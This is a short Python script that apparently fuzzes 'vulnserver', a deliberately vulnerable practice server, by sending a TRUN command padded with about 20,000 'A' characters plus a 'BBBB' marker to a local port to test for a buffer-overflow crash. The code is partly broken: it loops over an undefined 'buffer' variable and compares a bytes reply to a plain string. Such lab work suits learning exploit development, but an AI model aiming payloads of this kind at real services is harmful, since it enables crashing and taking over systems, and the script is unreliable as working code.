import socket
import sys
import pickle
import errno

stack_size = 20243

payload = "TRUN /.:/ ".ljust(stack_size,"A")
payload += "BBBB"

for string in buffer:
    print("Fuzzing vulnserver")
    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind(('0.0.0.0',0))
    
    s.connect(('127.0.0.1',9999))
    print("Made a connection", s.getsockname()[1])
    
    string_data =  payload.encode()
    s.send((string_data))
    print("Sent string")
    if str(s.recv(1024)) == "TRUN COMPLETE":
        print("We have recieved a reply. TRUN COMPLETE")
        print("print the server didn't crash.")
    else:
        try:
            s.settimeout(1)
            print(s.recv(1024))
        
        except Exception as serr:
            
            if serr.errno == errno.ECONNREFUSED:
                print("Server not running. or has crashed. Was the server on to begin with?")
        else:
            print("nothing happened. ")
        finally:
            print("Good bye!")
        
        s.close()



    


